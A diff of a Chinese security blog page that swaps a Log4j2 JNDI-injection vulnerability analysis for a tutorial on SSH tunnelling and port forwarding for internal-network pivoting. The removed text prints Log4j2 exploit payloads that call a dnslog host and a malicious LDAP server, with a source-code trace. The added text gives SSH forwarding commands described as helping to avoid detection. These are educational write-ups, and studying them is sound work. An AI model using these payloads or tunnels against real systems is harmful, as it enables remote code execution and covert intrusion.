@@ -4,9 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="log4j2漏洞, Ethe&#39;s blog">
-    <meta name="description" content="看面经和复习期末考试都怪无聊的，看点这个核弹级漏洞
-背景2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请">
+    <meta name="keywords" content="SSH隧道搭建与端口转发, Ethe&#39;s blog">
+    <meta name="description" content="SSH隧道搭建与端口转发SSH隧道SSH 端口转发又叫 SSH 隧道（tunnel），是在 SSH 连接的基础上，通过将客户端或服务器端的某个端口的数据放到 SSH 连接中加密传输，从而在不安全的网络中安全的传输数据或者绕过防火墙的限制实现">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>log4j2漏洞 | Ethe&#39;s blog</title>
+    <title>SSH隧道搭建与端口转发 | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -322,12 +321,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">log4j2漏洞</h1>
+                    <h1 class="description center-align post-title">SSH隧道搭建与端口转发</h1>
                 </div>
             </div>
         </div>
@@ -457,12 +456,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                                <span class="chip bg-color">web学习</span>
-                            </a>
-                        
-                            <a href="/tags/Java/">
-                                <span class="chip bg-color">Java</span>
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
                             </a>
                         
                     </div>
@@ -477,28 +472,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-06-04
+                    2025-06-04
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-06-17
+                    2025-06-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.7k
+                    2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    8 分
                 </div>
                 
 
@@ -521,391 +516,161 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>看面经和复习期末考试都怪无聊的，看点这个核弹级漏洞</p>
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。</p>
-<p>log4j2远程代码执行漏洞主要由于存在JNDI注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码。</p>
-<p>（阿里好像还因为没先跟cnvd说所以被罚了</p>
-<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h2><p>Apache Log4j 2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些问题。是目前最优秀的Java日志框架之一。</p>
-<p>本次漏洞影响范围为Log4j2最早期的版本2.0-beta9到2.14.1。</p>
-<p>由于Log4j2重新构建和设计了框架，所以可以认为两者是完全独立的两个日志组件。但是他们的包还是很相似，这里给出一点差异</p>
-<p>Log4j2分为2个jar包，一个是接口log4j-api-${版本号}.jar，一个是具体实现log4j-core-${版本号}.jar。Log4j只有一个jar包log4j-${版本号}.jar。<br>Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。<br>Log4j2的package名称前缀为org.apache.logging.log4j。Log4j的package名称前缀为org.apache.log4j。</p>
-<p>具体的发展过程可以看看这个<a target="_blank" rel="noopener" href="https://paper.seebug.org/1789/%E7%9A%84Java%E6%97%A5%E5%BF%97%E4%BD%93%E7%B3%BB%E9%83%A8%E5%88%86">https://paper.seebug.org/1789/的Java日志体系部分</a></p>
-<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>java命名和目录接口</p>
-<p><strong>它就像一个映射关系库，里面有很多资源，每个资源对应一个名字，当我查看这个名字时候，就会提供对应资源。将资源和名字进行了一对一映射。一些基本操作，发布服务bind(),查找服务lookup()。</strong></p>
-<h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p> 轻型目录访问协议</p>
-<p>LDAP可以理解是一个简单存储数据的数据库，不过它是树状结构的，树形结构存储数据，查询效率更高。</p>
-<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>第一个是由于JNDI的动态协议转换，即使初始化的context指定了协议，也会根据URL传入的参数来转换协议。</p>
-<p>其实就是说即使提前配置了Context.PROVIDER_URL属性，当我们调用lookup()方法时，如果lookup方法的参数是一个url地址，那么客户端就会去lookup()方法参数指定的uri中加载远程对象，而不是去Context.PROVIDER_URL设置的地址去加载对象。</p>
-<p>正是因为有这个特性，才导致当lookup()方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。</p>
-<p>第二个是由于JNDI Naming Reference，Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 LDAP 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p>
-<p>其实可以简单理解为我这LDAP存储空间有限，我把多余的数据放在我的一个web网站里面，可以通过url地址进行引用，查询的数据如果我自己数据库里面没有，我就会自动去我这个指定的地址在web网站查找指定资源。</p>
-<p>（这里jndi注入那篇写的有点赶，所以就没怎么细说原理，就在这里补上了</p>
-<h1 id="Log4j2源码浅析"><a href="#Log4j2源码浅析" class="headerlink" title="Log4j2源码浅析"></a>Log4j2源码浅析</h1><p>然后简单分析一下源码</p>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>先引入依赖</p>
-<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.14.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span></code></pre>
+                <h1 id="SSH隧道搭建与端口转发"><a href="#SSH隧道搭建与端口转发" class="headerlink" title="SSH隧道搭建与端口转发"></a>SSH隧道搭建与端口转发</h1><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>SSH 端口转发又叫 SSH 隧道（tunnel），是在 SSH 连接的基础上，通过将客户端或服务器端的某个端口的数据放到 SSH 连接中加密传输，从而在不安全的网络中安全的传输数据或者绕过防火墙的限制实现对目的主机目的端口的访问的一个功能。</p>
+<p>安全性高：SSH隧道利用SSH协议进行加密传输，可以确保数据传输的安全性。<br>稳定性强：SSH协议是一种稳定、可靠的协议，可以确保数据传输的准确性和稳定性。<br>传输效率低：传输效率不如其他协议的隧道<br>前提是需要对方开启ssh服务，并且知道对方的ssh账号和密码</p>
+<p>不同的后端站点所拿到的shell权限是不一样的。php、aspx的权限是继承中间件的，需要提权。是最低权限，而Java确实最高权限，无需提权。</p>
+<p>参数</p>
+<ul>
+<li>-C：压缩传输</li>
+<li>-f：将ssh转⼊后台，不占⽤当前shell</li>
+<li>-N：静默连接，减少被发现</li>
+<li>-g：允许远程主机连接本地用于端口转发</li>
+<li>-L：本地端⼝转发</li>
+<li>-R：远程点开转发</li>
+<li>-D：动态端⼝</li>
+<li>-P：指定ssh端口</li>
+</ul>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>ssh-keygen -A 初始化</p>
+<p>vim /etc/ssh/sshd_config 配置⽂件</p>
+<p> PermitRootLogin yes 允许root登⼊</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022014904.png" alt="img"></p>
+<h2 id="1-1-静态端口转发"><a href="#1-1-静态端口转发" class="headerlink" title="1.1 静态端口转发"></a>1.1 静态端口转发</h2><h3 id="1-1-1-本地端口转发"><a href="#1-1-1-本地端口转发" class="headerlink" title="1.1.1 本地端口转发"></a>1.1.1 本地端口转发</h3><p>场景：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022031926.png" alt="img"></p>
+<p>本地主机（A）、跳板机（B）、目标主机（C）</p>
+<p>A指定本地端口访问通过SSH连接转发给B，B将这些数据转发给C，同时将结果传回给A。（一般情况下B的端口是远程连接端口）</p>
+<p>使用：</p>
+<pre class="language-none"><code class="language-none">ssh -CfNg -L 本地端口:目标ip:目标端口 跳板账号@ip</code></pre>
 
-<p>在工程目录resources下创建log4j2.xml</p>
-<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<p>将目标ip的目标端口的流量通过跳板机转发到本地的端口上</p>
+<p>例子</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -L 8888:192.168.1.100:80 user@10.0.0.1</code></pre>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appenders</span><span class="token punctuation">></span></span>
-<span class="token comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SYSTEM_OUT<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
-<span class="token comment">&lt;!--            配置Console的模式布局--></span>
-            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appenders</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>loggers</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>loggers</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span></code></pre>
+<p>你本地（127.0.0.1）监听 <code>8888</code> 端口；</p>
+<p>当你访问 <code>http://127.0.0.1:8888</code> 时：</p>
+<ul>
+<li>SSH 会通过 <code>user@10.0.0.1</code> 这个跳板机（比如公网服务器）连接；</li>
+<li>然后在 <strong>10.0.0.1 机器上发起对 <code>192.168.1.100:80</code> 的访问请求</strong>；</li>
+<li>并把返回的数据通过 SSH 隧道转发回本地端口 <code>8888</code></li>
+</ul>
+<h3 id="1-1-2-远程端⼝转发"><a href="#1-1-2-远程端⼝转发" class="headerlink" title="1.1.2 远程端⼝转发"></a>1.1.2 远程端⼝转发</h3><p>场景：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022031278.png" alt="img"></p>
+<p>B需要使用内网C的端口，但是无法直接访问，需要A对B发起ssh连接，并将B的自定义端口转发到C端口上，使得B访问自身自定义端口便可以访问C的端口</p>
+<p>使用：</p>
+<pre class="language-none"><code class="language-none">A：ssh -CfNg -R 端⼝:⽬标ip:⽬标端⼝ 跳板账号@ip</code></pre>
 
-<p>log4j2中包含两个关键组件<code>LogManager</code>和<code>LoggerContext</code>。<code>LogManager</code>是Log4J2启动的入口，可以初始化对应的<code>LoggerContext</code>。<code>LoggerContext</code>会对配置文件进行解析等其它操作。</p>
-<p>在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604145321617.png" alt="image-20230604145321617"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604145339868.png" alt="image-20230604145339868"></p>
-<h2 id="属性占位符之Interpolator插值器"><a href="#属性占位符之Interpolator插值器" class="headerlink" title="属性占位符之Interpolator插值器"></a>属性占位符之Interpolator插值器</h2><p>log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:<code>$&#123;prefix:key&#125;</code>。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604150135457.png" alt="image-20230604150135457"></p>
-<p>简单说就是通过${prefix:key}这种方式可以调用这里面存的环境变量</p>
-<p>然后在输出错误信息的时候</p>
-<p>会进行一个检测</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604150546298.png" alt="image-20230604150546298"></p>
-<p>先找strLookupMap里有没有这个prefix</p>
-<p>比如这里这个prefix就是java</p>
-<p>然后就会去调用对应的lookup方法</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151107758.png" alt="image-20230604151107758"></p>
-<p>假如我把java改成marker</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151221638.png" alt="image-20230604151221638"></p>
-<p>那再假如这里不是marker，而是jndi，那调用的就会是jndi的lookup，就有可能会造成jndi的注入</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151534344.png" alt="image-20230604151534344"></p>
-<p>这里虽然是JndiLookup，但是看名字最后调用的应该就是jndi的lookup，先不往下跟了，之后再说</p>
-<h2 id="模式布局"><a href="#模式布局" class="headerlink" title="模式布局"></a>模式布局</h2><p>log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有<code>PatternLayout</code>，也就是我们在配置文件中<code>PatternLayout</code>字段所指定的属性<code>pattern</code>的值<code>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n</code>。 <code>%msg</code>表示所输出的消息</p>
-<p><code>PatternLayout</code>模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个<code>List&lt;PatternConverter&gt;</code>转换器列表和<code>List&lt;FormattingInfo&gt;</code>格式信息列表。在配置文件<code>PatternLayout</code>标签的<code>pattern</code>属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过<code>PluginManager</code>收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。</p>
-<table>
-<thead>
-<tr>
-<th>序号</th>
-<th>名称</th>
-<th>类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>d date</td>
-<td>DatePatternConverter</td>
-<td>日志的时间戳</td>
-</tr>
-<tr>
-<td>2</td>
-<td>p level</td>
-<td>LevelPatternConverter</td>
-<td>日志级别</td>
-</tr>
-<tr>
-<td>3</td>
-<td>m msg message</td>
-<td>MessagePatternConverter</td>
-<td>日志中的消息内容</td>
-</tr>
-<tr>
-<td>4</td>
-<td>C class</td>
-<td>ClassNamePatternConverter</td>
-<td>日志打印点所在类的类名 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
-</tr>
-<tr>
-<td>5</td>
-<td>M method</td>
-<td>MethodLocationPatternConverter</td>
-<td>日志打印点所在方法的方法名 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
-</tr>
-<tr>
-<td>6</td>
-<td>c logger</td>
-<td>LoggerPatternConverter</td>
-<td>Logger实例的名称</td>
-</tr>
-<tr>
-<td>7</td>
-<td>n</td>
-<td>LineSeparatorPatternConverter</td>
-<td>专门追加换行符</td>
-</tr>
-<tr>
-<td>8</td>
-<td>properties</td>
-<td>Log4j1MdcPatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>9</td>
-<td>ndc</td>
-<td>Log4j1NdcPatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>10</td>
-<td>enc encode</td>
-<td>EncodingPatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>11</td>
-<td>equalsIgnoreCase</td>
-<td>EqualsIgnoreCaseReplacementConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>12</td>
-<td>equals</td>
-<td>EqualsReplacementConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>13</td>
-<td>xEx xThroable xException</td>
-<td>ExtendedThrowablePatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>14</td>
-<td>F file</td>
-<td>FileLocationPatternConverter</td>
-<td><strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
-</tr>
-<tr>
-<td>15</td>
-<td>l location</td>
-<td>FullLocationPatternConverter</td>
-<td>相当于%C.%M(%F:%L) <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
-</tr>
-<tr>
-<td>16</td>
-<td>highlight</td>
-<td>HighlightConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>17</td>
-<td>L line</td>
-<td>LineLocationPatternConverter</td>
-<td>日志打印点的代码行数 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
-</tr>
-<tr>
-<td>18</td>
-<td>K map MAP</td>
-<td>MapPatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>19</td>
-<td>marker</td>
-<td>MarkerPatternConverter</td>
-<td>打印完整标记,格式如:标记名[父标记名[祖父标记名]],一个标记可以有多个父标记</td>
-</tr>
-<tr>
-<td>20</td>
-<td>markerSimpleName</td>
-<td>MarkerSimpleNamePatternConverter</td>
-<td>只打印标记的名称</td>
-</tr>
-<tr>
-<td>21</td>
-<td>maxLength maxLen</td>
-<td>MaxLengthConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>22</td>
-<td>X mdc MDC</td>
-<td>MdcPatternConverter</td>
-<td><code>LogEvent.getContextData()</code>映射诊断上下文</td>
-</tr>
-<tr>
-<td>23</td>
-<td>N nano</td>
-<td>NanoTimePatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>24</td>
-<td>x NDC</td>
-<td>NdcPatternConverter</td>
-<td><code>LogEvent.getContextStack()</code>嵌套诊断上下文</td>
-</tr>
-<tr>
-<td>25</td>
-<td>replace</td>
-<td>RegexReplacementConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>26</td>
-<td>r relative</td>
-<td>RelativeTimePatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>27</td>
-<td>rEx rThrowable rException</td>
-<td>RootThrowablePatternConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>28</td>
-<td>style</td>
-<td>StyleConverter</td>
-<td></td>
-</tr>
-<tr>
-<td>29</td>
-<td>T tid threadId</td>
-<td>ThreadIdPatternConverter</td>
-<td>线程id</td>
-</tr>
-<tr>
-<td>30</td>
-<td>t tn thread threadName</td>
-<td>ThreadNamePatternConverter</td>
-<td>线程名称</td>
-</tr>
-<tr>
-<td>31</td>
-<td>tp threadPriority</td>
-<td>ThreadPriorityPatternConverter</td>
-<td>线程优先级</td>
-</tr>
-<tr>
-<td>32</td>
-<td>ex throwable Exception</td>
-<td>ThrowablePatternConverter</td>
-<td>异常</td>
-</tr>
-<tr>
-<td>33</td>
-<td>u uuid</td>
-<td>UuidPatternConverter</td>
-<td>生成一个uuid,随日志一起打印,用于唯一标识一条日志</td>
-</tr>
-<tr>
-<td>34</td>
-<td>notEmpty varsNotEmpty variablesNotEmpty</td>
-<td>VariablesNotEmptyReplacementConverter</td>
-<td></td>
-</tr>
-</tbody></table>
-<p>简单说就是如果配置文件里写的是%msg这种，就去找MessagePatternConverter进行处理</p>
-<p>这个MessagePatternConverter也是log4j漏洞产生的一个重要原因</p>
-<h2 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h2><p>log4j2支持多种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：<code>fatal(致命的), error, warn, info, debug, trace(堆栈)。</code>  log4j2还定义了一个内置的标准级别<code>intLevel</code>，由数值表示，级别越高数值越小。</p>
-<p>当日志级别（调用）大于等于系统设置的<code>intLevel</code>的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中<code>&lt;root level=&quot;error&quot;&gt;</code>值设置<code>intLevel</code>。当然我们也可以通过<code>Configurator.setLevel(&quot;当前类名&quot;, Level.INFO);</code>来手动设置。</p>
-<p>如果没有配置文件也没有指定则会默认使用Error级别，也就是200</p>
-<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>网上最常见的就是dnslog的payload</p>
-<pre class="language-java" data-language="java"><code class="language-java">$&#123;jndi:ldap:&#x2F;&#x2F;xxxx.ceye.io&#125;</code></pre>
+<p>例子：</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -R 8888:127.0.0.1:22 user@10.0.0.1</code></pre>
 
-<p>其实就是调用jndi的lookup，然后url就是dns://xxxx.ceye.io。让被攻击侧往这个url上发起dns请求</p>
-<p>这里我就直接用ldap弹计算器了</p>
-<p>首先是开启一个本地的ldap服务端，然后python在恶意字节码目录下起个服务</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163412225.png" alt="image-20230604163412225"></p>
-<p>跟一下流程</p>
-<p>把断点下在<code>org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java</code>中的<code>directEncodeEvent</code>方法上</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163717093.png" alt="image-20230604163717093"></p>
-<p>这里会获取当前使用的布局，然后调用对应的encode方法</p>
-<p>默认的话就是PatternLayout</p>
-<p>所以就会调用PatternLayout的encode方法</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163829932.png" alt="image-20230604163829932"></p>
-<p>这里面有个toText方法</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163928931.png" alt="image-20230604163928931"></p>
-<p>接着进入toSerializable</p>
-<p>这里边就会调用不同的Converter来处理传入的数据</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164138244.png" alt="image-20230604164138244"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164227823.png" alt="image-20230604164227823"></p>
-<p>这里我们只跟MessagePatternConverter  </p>
-<p>在MessagePatternConverter 的format里，对字符串进行了处理</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164448382.png" alt="image-20230604164448382"></p>
-<p>最主要的就是这个if里</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604165229803.png" alt="image-20230604165229803"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604165308270.png" alt="image-20230604165308270"></p>
-<p>可以看到第二行重设了workingBuilder这个StringBuilder对象的长度，把原本的83改成了50</p>
-<p>这个50就是在输出的这行日志中出现$字符的位置</p>
-<p>也就是说把${jndi:ldap://127.0.0.1:9999/exp}单独切了出来，不在workingBuilder里了</p>
-<p>然后最后一行又进行了一个append操作，加入的内容是config.getStrSubstitutor().replace(event, value)</p>
-<p>这里又是个替换</p>
-<blockquote>
-<p>使用 Apache Commons Configuration 库中的 <code>StrSubstitutor</code> 对象来替换字符串中的占位符。</p>
-<p><code>StrSubstitutor</code> 是一个用于替换字符串中的变量的工具类。它可以根据提供的键值对，将字符串中的占位符替换为对应的值。通常情况下，占位符使用 <code>$&#123;&#125;</code> 或者 <code>$()</code> 包围。</p>
-</blockquote>
-<p>value就是我们之前切出来的${jndi:ldap://127.0.0.1:9999/exp}</p>
-<p>继续跟进会到Interpolator.lookup</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604170321668.png" alt="image-20230604170321668"></p>
-<p>这里就是之前说的插值器的地方</p>
-<p>先根据var.indexOf(<em>PREFIX_SEPARATOR</em>);判断&quot;:&quot;之前的字符</p>
-<p>再通过</p>
-<pre class="language-java" data-language="java"><code class="language-java">final String prefix &#x3D; var.substring(0, prefixPos).toLowerCase(Locale.US);
-final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
+<p>在 <strong>跳板机（10.0.0.1）上开启 8888 端口监听</strong>；</p>
+<p>当跳板机访问 <code>localhost:8888</code> 时，SSH 会将连接反向转发给你本地的 <code>127.0.0.1:22</code>（即你的 SSH）；</p>
+<p>相当于你把自己的 <strong>SSH 暴露到了跳板机的 8888 端口</strong>。</p>
+<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>本地端口转发的目的是为了通过本地访问被攻击ip的对应端口的服务，</p>
+<pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -L 8888:192.168.1.100:80 user@10.0.0.1</code></pre>
 
-<p>把第一个:前后的东西分离</p>
-<p>然后因为我们这里是jndi，所以这里的lookup就是JndiLookup</p>
-<p>很自然就进JndiLookup的lookup方法里了</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604170942269.png" alt="image-20230604170942269"></p>
-<p>继续进jndiManager.lookup</p>
-<p>这个jndiName就是我们写的恶意ldap的url了</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171109684.png" alt="image-20230604171109684"></p>
-<p>现在到了InitialContext的lookup里了</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171437462.png" alt="image-20230604171437462"></p>
-<p>后边就纯ldap的jndi的路了</p>
-<p>恶意url也传进去了</p>
